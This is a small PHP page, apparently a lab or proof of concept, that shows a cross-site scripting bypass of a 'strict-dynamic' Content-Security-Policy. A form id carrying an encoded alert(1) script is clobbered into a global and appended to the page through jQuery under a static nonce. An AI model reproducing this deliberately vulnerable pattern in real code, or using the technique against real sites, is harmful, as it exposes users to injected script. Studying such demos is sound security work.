<?php
header("Content-Security-Policy: script-src 'nonce-RP2jer9RVGVN' 'strict-dynamic';");
?>
<script nonce="RP2jer9RVGVN" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

<form name="effects" id="&lt;script&gt;alert(1)&lt;/script&gt;">
<input type="hidden" id="effect" value="id">


<script nonce="RP2jer9RVGVN">
$(document).ready(function(){
    $("body").append(effects[$("#effect").val()]);
});
</script>
